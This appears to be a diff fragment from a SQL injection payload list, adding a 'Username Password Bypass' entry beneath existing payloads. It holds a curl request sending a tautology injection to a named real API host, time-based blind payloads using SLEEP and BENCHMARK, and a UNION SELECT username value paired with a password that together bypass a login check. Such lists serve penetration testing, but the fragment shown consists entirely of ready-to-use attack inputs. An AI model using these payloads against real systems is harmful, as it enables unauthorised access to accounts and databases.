@@ -210,3 +210,10 @@ sleep 2 && curl "https://api.eu.app.varonis.io/resource?param=' OR '1'='1' --"
 ' OR IF(1=1, SLEEP(5), 0)--
 ' OR BENCHMARK(1000000, MD5('test'))--
 
+
+
+## Username Password Bypass
+username: ' UNION SELECT 'pass' AS password FROM admins WHERE '1' = '1
+password: pass
+
+##
